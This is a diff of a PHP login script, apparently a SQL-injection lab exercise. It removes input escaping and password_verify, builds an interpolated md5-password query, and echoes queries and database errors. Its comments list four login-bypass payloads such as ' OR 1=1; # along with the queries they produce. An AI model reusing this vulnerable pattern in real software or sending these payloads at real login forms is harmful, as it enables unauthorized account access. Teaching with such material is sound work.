@@ -1,66 +1,44 @@
 <?php
-    require 'conf/db.php';
+    require '../conf/db.php';
 
     ini_set('display_errors', 1);
     error_reporting(E_ALL);
 
-    $sesh_user = $_SESSION["username"];
-    if (isset($sesh_user)) {
+    if (isset($_POST['username']) && isset($_POST['password'])) {
 
         $username = $_POST['username'];
         $password = $_POST['password'];
 
-        $username =  mysqli_real_escape_string($conn, $username);
-        $password =  mysqli_real_escape_string($conn, $password);
-        $hashed_password = password_hash($password, PASSWORD_DEFAULT);
+        // $username =  mysqli_real_escape_string($conn, $username);
+        // $password =  mysqli_real_escape_string($conn, $password);
 
-        // $query = "SELECT * from `users`
-        //     WHERE `username` = '$username'
-        //     LIMIT 1";
-        //
-        // $result = mysqli_query($conn, $query);
-        //
-        // if (mysqli_num_rows($result) > 0) {
-        //     while($row = mysqli_fetch_assoc($result)) {
-        //         if (password_verify($password, $row["password"])) {
-        //             echo "Successfully logged in";
-        //         } else {
-        //             echo "Invalid username or password";
-        //         }
-        //     }
-        // } else {
-        //     echo "Invalid username or password";
-        // }
+        $hashed_pw = md5($password);
 
-        $hashed_password = md5($password);
-        $query = "SELECT * from `users`
-            WHERE `username` = '$username'
-            AND `password` = '$hashed_password'";
+        echo $query = "SELECT * FROM users WHERE username = '$username' AND password= '$hashed_pw'";
 
-        $result = mysqli_query($conn, $query);
+        $result = mysqli_query($conn, $query) or die('Query fails: ' . mysqli_error($conn));
         $count = $result->num_rows;
 
+        echo "<br/>";
         if ($count > 0) {
-            while ($row = mysqli_fetch_array($result, MYSQL_BOTH)) {
-                session_start();
-                $_SESSION["username"] = $row["username"];
-                // echo "Welcome " . $_SESSION["username"];
-            }
+            echo "Welcome!";
         } else {
-            echo "Invalid username or password";
+            echo "Invalid credentials";
         }
     }
 
-    if (isset($sesh_user])) {
-    ?>
-        <h1> Welcome <?=$sesh_user?></h1>
-        <form method="GET" action="form.php">
-            <textarea></textarea>
-            <br><br>
-            <input type="submit" value="Submit">
-        </form>
+    // DESC: Inject bypass login
 
-    <?php
-        } else { }
-    }
+    // INPUT: melai' OR 1=1; #
+    // Knows the username, not the password
+    // QUERY: SELECT * FROM users WHERE username = 'melai' OR 1=1; #' AND password= 'd41d8cd98f00b204e9800998ecf8427e'
+
+    // INPUT: ' OR 1=1; #
+    // QUERY: SELECT * FROM users WHERE username = '' OR 1=1; #' AND password= 'd41d8cd98f00b204e9800998ecf8427e'
+
+    // INPUT: ' or 1; #
+    // QUERY: SELECT * FROM users WHERE username = '' or 1; #' AND password= 'd41d8cd98f00b204e9800998ecf8427e'
+
+    // INPUT: x' or ''='' #
+    // QUERY: SELECT * FROM users WHERE username = 'x' or ''='' #' AND password= 'd41d8cd98f00b204e9800998ecf8427e'
 ?>
